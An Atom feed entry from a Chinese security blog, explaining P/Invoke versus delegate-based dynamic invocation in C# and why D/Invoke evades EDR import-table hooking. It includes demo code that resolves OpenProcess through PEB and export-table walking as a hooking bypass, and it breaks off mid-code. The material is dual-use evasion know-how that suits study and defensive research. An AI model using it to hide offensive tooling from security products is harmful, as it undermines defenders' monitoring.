<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RcoIl的窝</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://rcoil.me/"/>
  <updated>2020-12-01T13:52:10.263Z</updated>
  <id>https://rcoil.me/</id>
  
  <author>
    <name>RcoIl</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【知识回顾】关于 CSharp 中调用非托管代码的方法</title>
    <link href="https://rcoil.me/2020/12/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%85%B3%E4%BA%8E%20CSharp%20%E4%B8%AD%E8%B0%83%E7%94%A8%E9%9D%9E%E6%89%98%E7%AE%A1%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://rcoil.me/2020/12/【知识回顾】关于 CSharp 中调用非托管代码的方法/</id>
    <published>2020-12-01T13:29:11.000Z</published>
    <updated>2020-12-01T13:52:10.263Z</updated>
    
    <content type="html"><![CDATA[<p>本文并非从专业开发的角度去阐述托管/非托管的概念及托管代码如何调用非托管代码，而是从日常的工具编写中及使用中遇到的一些问题，带着解决问题的态度出发，去看待这么一个过程。</p><p>整个过程并非专业解析，而只是助于我们理解罢了。</p><a id="more"></a><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>托管/非托管是微软的 .NET Framework 中特有的概念，其中，非托管代码也叫本地（Native）代码。与 Java 中的机制类似，也是先将源代码编译成中间代码（MSIL，Microsoft Intermediate Language），然后再由 .NET 中的 CLR 将中间代码编译成机器代码。</p><p>在 Csharp 中，托管代码引用非托管代码的方式一般有两种：</p><ul><li>P/Invoke（平台调用）</li><li>Delegate（委托）-&gt; 后续转换为 D/Invoke（动态调用）</li></ul><p>而个人在日常工具编写的过程中，经常用到的调用方式是 <code>P/Invoke</code>。这种方式普遍应用于各大工具开发中，对于这种方式，从攻击角度来看，存在一些缺陷：</p><ul><li>通过 <code>P/Invoke</code> 进行的任何 Windows API 引用都将在 .NET 程序集的 “导入表” 中产生一个相应的条目；</li><li>在存在任何可监视 API 调用（如通过 API Hooking）的安全产品，都会在 <code>P/Invoke</code> 调用任何 API 上看到警告/阻止，这个 Hook 方式称之为 <strong>IAT hooking</strong>。</li></ul><p>而动态调用的目的是提供一种访问（调用）这些 Windows API 的替代方案，而不会留下这些特定的指标（并不是说动态调用没有自身的指标）。</p><p>但是关于 <code>Delegate</code> 的使用，我们在大多数利用工具的开发中，很少人会去用到。但是如果去搜索这东西，会发现很早就有人使用它来写了东西，因此我们可以很快的找到<a href="https://www.cnblogs.com/wubiyu/archive/2008/09/09/1287618.html" target="_blank" rel="noopener">资料</a>进行学习。<code>Delegate</code> 主要用于解决 Csharp 和 DLL 之间的数据传送问题：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在这种混合编程中，Csharp 和 DLL 之间如何进行数据传送？这个问题起始很复杂，像 <span class="keyword">int</span>，<span class="keyword">double</span> 这种基本的数据类型，是很好传递的。到了 <span class="keyword">byte</span> 和 <span class="keyword">char</span>，就有点复杂了，更复杂的还有 <span class="keyword">string</span> 和 stringBuilder，以及结构体的传递等。</span><br></pre></td></tr></table></figure><p>若传递的是函数指针，有两种方法：</p><ul><li><p>由于 Csharp 中没有函数指针的概念，因此采用委托（<code>Delegate</code>）的方式，使用 Intptr 存储指针，并使用 ref 获得地址（&amp;）;</p></li><li><p>另一种是在 Csharp 中编写非托管的代码，用 unsafe 声明：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsafe</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 非托管代码</span></span><br><span class="line">  <span class="comment">// 在非托管代码中，即可进行指针相关的操作。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>因此本文会对 <code>P/Invoke</code>，<code>Delegate</code> 两种调用方式进行一些说明，并说明动态调用为什么可以绕过 <strong>IAT hooking</strong>。</p><h3 id="0x01-IAT-hooking"><a href="#0x01-IAT-hooking" class="headerlink" title="0x01 IAT hooking"></a>0x01 IAT hooking</h3><blockquote><p>Hook 的概念就不累述了</p></blockquote><p>即使是基于 CS 的 <code>execute-assembly</code> 等内存执行方法，EDR 通过 Hook 进程，也能捕获到进攻性行为。针对这种情况，<a href="https://twitter.com/_ethicalchaos_?lang=en" target="_blank" rel="noopener">@CCob</a> 巨佬在他的文章中也给了一个非常奈斯的例子，证明的这个 POC，以及如何绕过这种 Hooking。一个高效的 EDR，会尽可能的 Hooking 底层函数，如 NT 级别的 Win32 API。下图是一个很好的例子，充分阐明了 EDR 的工作原理（其中 ntdll.dll 负责向 Windows 内核进行系统调用）：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/ntdll_hooks.png" alt=""></p><p>EDR 的 Hook 方式主要有两种：</p><ul><li><strong><em>IAT hooking：</em></strong>IAT 是 <code>Import Address Table</code> 的缩写。每个可执行程序都拥有该 IAT 区域，程序运行时，PE 装载器会将 Win32 API 的函数地址记录到 IAT 区域，在 EDR 的 hook.dll 注入到程序后，当程序调用到记录在内的函数时，则跳转至 hook.dll（至于是什么函数才跳转，由 EDR 决定）。</li><li><strong><em>Inline hooking：</em></strong>是一种通过修改机器码的方式来实现 Hook 的技术。</li></ul><p>我们这就讲讲 <code>IAT hooking</code> 就好。关于 IAT hooking，可一看看下面的图：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/assets_-LFEMnER3fywgFHoroYn_-LujUxqEwvQ8GVJuyKNY_-LulPrP3NUbUY6FD2CpU_image.png" alt=""></p><p>在此示例中，就是简单的调用一个 <code>MessageBoxA</code> 的程序，该程序将会在 <code>Import Address Table</code> 中查找 <code>MessageBoxA</code> 的地址，以便它能够顺利的运行。</p><p>我们不知道的是， EDR 参与了其中，其实 EDR 替换了程序中的 IAT 区域内容。在程序调用 <code>MessageBoxA</code> 时，实际上该调用已经被 EDR 强制跳转到它自身 dll 的地址，因此最后是由 EDR 判断传递的数据是否是恶意的，还是正常的。如果是恶意代码，则拦截执行，反之。</p><p>从进攻角度来看，我们可以利用系统调用来绕过这些 Hook 方法，比较有参考的例子有：</p><ul><li>MDSec 的 <a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/" target="_blank" rel="noopener">Firewalker</a></li><li><a href="https://twitter.com/_EthicalChaos_" target="_blank" rel="noopener">@CCob</a> 的 <a href="https://github.com/CCob/SharpBlock" target="_blank" rel="noopener">Sharpblock</a></li></ul><h3 id="0x02-Platform-Invocation"><a href="#0x02-Platform-Invocation" class="headerlink" title="0x02 Platform Invocation"></a>0x02 Platform Invocation</h3><p>Csharp 能够像 C/C++ 一样可以调用 Win32 API 函数，大部分调用的方式是：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DemoApp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Import user32.dll (containing the function we need) and define</span></span><br><span class="line">        <span class="comment">// the method corresponding to the native function.</span></span><br><span class="line">        [<span class="meta">DllImport(<span class="meta-string">"user32.dll"</span>, CharSet = CharSet.Unicode, SetLastError = true)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">MessageBox</span>(<span class="params">IntPtr hWnd, <span class="keyword">string</span> lpText, <span class="keyword">string</span> lpCaption, <span class="keyword">uint</span> uType</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">// Invoke the function as a regular managed method.</span></span><br><span class="line">            MessageBox(IntPtr.Zero, <span class="string">"Command-line message box"</span>, <span class="string">"Attention!"</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 .NET 中，这个调用过程被称为 <a href="https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke" target="_blank" rel="noopener">Platform Invoking</a>，简称 <code>P/invoke</code> 。该机制允许 .NET 应用程序方位非托管库（DLL）中的数据和 API。通过使用 <code>P/invoke</code>，Csharp 开发人员可以轻松地调用标准 Win32 API。</p><p>该过程主要是利用 <code>System.Runtime.InteropServices</code> 命名空间来完成，且由 CLR 管理。下图显示了 <code>P/invoke</code> 中非托管代码与托管代码之间的联系及过程：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/platform-invoke-call.gif" alt=""></p><p>当 <code>P/invoke</code> 调用非托管函数时，它将执行以下操作序列：</p><ol><li>找到包含函数的 DLL；</li><li>将 DLL 加载到内存中；</li><li>在内存中找到该函数的地址，并将其参数压入堆栈，根据需要封送数据；</li></ol><ol start="4"><li>将控制权转移到非托管功能。</li></ol><p><code>P/invoke</code> 会将由非托管函数生成的异常抛出给托管调用方。</p><p>但是，利用 .NET 也存在操作上的缺点（第一小节中已经说明）。由于是 CLR 负责将 .NET 翻译成机器代码（语言），而可执行文件并没有直接翻译成这种代码。因此，可执行文件将整个代码库存储它的汇编代码中，因此稍微逆向该可执行文件，就可以看到全部信息。比如以下的一些信息：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/blog_2020-11-27_10-40-18.png" alt=""></p><h3 id="0x03-Delegate"><a href="#0x03-Delegate" class="headerlink" title="0x03 Delegate"></a>0x03 Delegate</h3><p>现在好多的工具都开始以动态调用/执行的方式进行编写，这是非常有趣的一点，也是非常值得我们去学习。<code>D/invoke</code> 允许我们调用 <code>P/invoke</code> 所使用的 API，但它不是静态导入，而是动态导入。这样子就不会将 Win32 API 地址写入 <code>Import Address Table</code> 中，这就意味着我们完全的绕过了 <code>IAT hooking</code>。所以如果程序是使用了动态调用，我们是无法查看程序的导出表的。</p><p>那么，我们怎么实现动态调用呢？与其使用 P/Invoke 导入我们想调用的 API，不如将 DLL 手动加载到内存中。此后，我们会得到一个指向该 DLL 中的一个函数的指针，后续可以在传参的同时从指针中调用该函数。</p><p>那么说到指针，不得不说 C# 中的 Delegate（委托）了，该部分内容在第一小节中有讲到。因此我们直接看看具体是怎么实现的。</p><p><strong><em>我们的目的是在内存中调用非托管代码</em></strong>。</p><p>可以通过 <code>Delegate</code> 的来实现这一点。.NET 包含了 Delegate API，作为在类中包装方法/函数的一种方式。如果你们曾经使用反射来枚举类中的方法，那么你可以自己观察一下，实际上就是一种 Delegate 的形式。</p><p>Delegate API 有很多奇妙的功能，比如可以从一个函数的指针实例化一个 Delegate，并在传递参数的同时动态调用该函数。这里主要用的函数是：<code>GetDelegateForFunctionPointer</code></p><p>该函数原型为：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Delegate <span class="title">GetDelegateForFunctionPointer</span> (<span class="params">IntPtr ptr, Type t</span>)</span>;</span><br></pre></td></tr></table></figure><p>需要两个参数，分别为：</p><ul><li><strong><em>IntPtr ptr：</em></strong>要转换的非托管函数指针。</li><li><strong><em>Type t：</em></strong>要返回的委托人的类型，也就是要传入的非托管代码的函数原型。</li></ul><p>当看到 <code>Type t</code> 这个类型参数时，可能会不理解。这其实就是操作者传入要调用的非托管代码的函数原型的地方。这可以让 Delegate 知道当它调用函数时如何设置 CPU 寄存器和栈。</p><p>如果你记得在 <code>P/Invoke</code> 中，肯定用过类似这样的方式来设置函数：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32.dll"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">OpenProcess</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ProcessAccessFlags dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">bool</span> bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">uint</span> dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure><p>定义一个委托的方式与此类似，可以像定义变量一样定义一个委托。同时还要指定由委托人封装的函数时使用的调用约定（C++的标准调用约定是 StdCall），此处的调用约定务必一致，要不然会出现堆栈被破坏的情况。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">UnmanagedFunctionPointer(CallingConvention.StdCall)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">delegate</span> IntPtr <span class="title">OpenProcess</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint</span> dwDesiredAccess, </span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">bool</span> bInheritHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint</span> dwProcessId</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure><p>一个函数原型就定义完成。</p><p><strong><em>接下来就看看怎么获取函数的指针了。</em></strong></p><p>如果了解一些 PE 结构，可以知道由于所有的程序在初始化运行时，本身都会加载一些模块（库），这些模块是保证程序能正常运行的基本要素。因此可直接在当前进程中查找所需模块，即可获取到基址。实现如下：</p><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/blog_2020-11-29_11-00-27.png" alt=""></p><p>在获取模块基址之后，通过遍历模块导出表来解析函数的地址，具体实现，可以在 4.2 章节看到。这里还有一个要注意的问题，那就是如果程序在初始化时，所调用的库并没有在预加载的模块里面，那么上面的代码就不会返回结果。这种情况就需要从磁盘中查找所需 DLL。</p><p>基础条件已经满足，因此直接套用即可，这部分内容，TheWover 已经写好了库。</p><blockquote><p>TheWover 写了一篇关于为什么使用 D/invoke 而非 P/invlke 的原因的<a href="https://thewover.github.io/Dynamic-Invoke/" target="_blank" rel="noopener">文章</a>，强烈推荐。并且他还发布了一个 <a href="https://github.com/TheWover/DInvoke" target="_blank" rel="noopener">NuGet</a> 包，该库其实就是一个 Delegate 库和函数包装器，目前基本满足平时的工具开发需求，它实现了定义结构及功能，只需要引用即可。</p></blockquote><h3 id="0x04-示例"><a href="#0x04-示例" class="headerlink" title="0x04 示例"></a>0x04 示例</h3><p>上面说了 TheWover 发布了他的 DInvoke 项目，这个项目主要是帮我们定义处理对应的结构及功能，否则需要自己去定义对应的结构。如果不想使用这个项目，那么自己手动构造即可，这个后续会说到。</p><h4 id="4-1、使用-DInvoke"><a href="#4-1、使用-DInvoke" class="headerlink" title="4.1、使用 DInvoke"></a>4.1、使用 DInvoke</h4><p>这里直接使用官方的示例。下面的例子演示了如何使用 DInvoke 动态查找和调用一个 DLL 的函数地址：</p><ul><li><p>获取 ntdll.dll 的基址。当它被初始化时，它被加载到每个 Windows 进程中，所以我们知道它已经被加载了。因此，我们可以搜索 PEB 的加载模块列- 表来找到它的引用。一旦我们从 PEB 中找到了它的基址，我们就输出地址；</p></li><li><p>给定一个函数名称，使用 GetLibraryAddress 在 ntdll.dll 中找到一它的地址；</p></li><li><p>给定一个函数的序号，使用 GetLibraryAddress 在 ntdll.dll 中找到一它的地址；</p></li><li><p>给定一个函数的 HMACMD5 值，使用 GetLibraryAddress 在 ntdll.dll 中找到一它的地址；</p></li><li><p>在获取 ntdll.dll 的前提下，使用 GetExportAddress 在内存中按给定的函数名查找地址。</p></li></ul><p><img src="/image/【知识回顾】关于 CSharp 中调用非托管代码的方法/blog_2020-11-25_20-42-50.png" alt=""></p><p>再看看官方的另一个例子。在下面的示例中，我们先使用 P/Invoke 调用 OpenProcess。然后，我们再使用 D/Invoke 方式调用它（多种），并证明任何一种动态调用的机制都成功执行了非托管代码且绕过了 API hooking。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span>Author: TheWover</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> Data = DInvoke.Data;</span><br><span class="line"><span class="keyword">using</span> DynamicInvoke = DInvoke.DynamicInvoke;</span><br><span class="line"><span class="keyword">using</span> ManualMap = DInvoke.ManualMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SpTestcase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DllImport(<span class="meta-string">"kernel32.dll"</span>, SetLastError = true)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">OpenProcess</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            Data.Win32.Kernel32.ProcessAccessFlags processAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">bool</span> bInheritHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">uint</span> processId</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">// Details</span></span><br><span class="line">            String testDetail = <span class="string">@"</span></span><br><span class="line"><span class="string">            #=================&gt;</span></span><br><span class="line"><span class="string">            # Hello there!</span></span><br><span class="line"><span class="string">            # I demonstrate API Hooking bypasses</span></span><br><span class="line"><span class="string">            # by calling OpenProcess via</span></span><br><span class="line"><span class="string">            # PInvoke then DInvoke.</span></span><br><span class="line"><span class="string">            # All handles are requested with</span></span><br><span class="line"><span class="string">            # PROCESS_ALL_ACCESS permissions.</span></span><br><span class="line"><span class="string">            #=================&gt;</span></span><br><span class="line"><span class="string">            "</span>;</span><br><span class="line">            Console.WriteLine(testDetail);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//PID of current process.</span></span><br><span class="line">            <span class="keyword">uint</span> id = Convert.ToUInt32(System.Diagnostics.Process.GetCurrentProcess().Id);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Process handle</span></span><br><span class="line">            IntPtr hProc;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create the array for the parameters for OpenProcess</span></span><br><span class="line">            <span class="keyword">object</span>[] paramaters =</span><br><span class="line">            &#123;</span><br><span class="line">                Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,</span><br><span class="line">                <span class="literal">false</span>,</span><br><span class="line">                id</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span>/</span></span><br><span class="line">            <span class="comment">// 以 P/Invoke 方式调用 OpenProcess</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[?] Call OpenProcess via PInvoke ..."</span>);</span><br><span class="line">            hProc = OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, <span class="literal">false</span>, id);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Process handle : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, hProc.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span>/</span></span><br><span class="line">            <span class="comment">// 使用GetLibraryAddress调用OpenProcess (underneath the hood)</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[?] Call OpenProcess from the loaded module list using System.Diagnostics.Process.GetCurrentProcess().Modules ..."</span>);</span><br><span class="line">            hProc = DynamicInvoke.Win32.OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, <span class="literal">false</span>, id);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Process handle : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, hProc.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span>/</span></span><br><span class="line">            <span class="comment">// 在 PEB 中查找指定函数名称的地址</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[?] Specifying the name of a DLL (\"kernel32.dll\"), search the PEB for the loaded module and resolve a function by walking the export table in-memory..."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Search by name --&gt; OpenProcess"</span>);</span><br><span class="line">            IntPtr pkernel32 = DynamicInvoke.Generic.GetPebLdrModuleEntry(<span class="string">"kernel32.dll"</span>);</span><br><span class="line">            IntPtr pOpenProcess = DynamicInvoke.Generic.GetExportAddress(pkernel32, <span class="string">"OpenProcess"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Call OpenProcess</span></span><br><span class="line">            hProc = (IntPtr)DynamicInvoke.Generic.DynamicFunctionInvoke(pOpenProcess, <span class="keyword">typeof</span>(DynamicInvoke.Win32.Delegates.OpenProcess), <span class="keyword">ref</span> paramaters);</span><br><span class="line">            Console.WriteLine(<span class="string">"[&gt;] Process Handle : "</span> + <span class="keyword">string</span>.Format(<span class="string">"&#123;0:X&#125;"</span>, hProc.ToInt64()) + <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Pause execution</span></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Pausing execution.."</span>);</span><br><span class="line">            Console.ReadLine();</span><br><span class="line"></span><br><span class="line">            <span class="comment"><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span><span class="doctag">///</span>/</span></span><br><span class="line">            <span class="comment">// 手动映射 kernel32.dll</span></span><br><span class="line">            <span class="comment">// 在 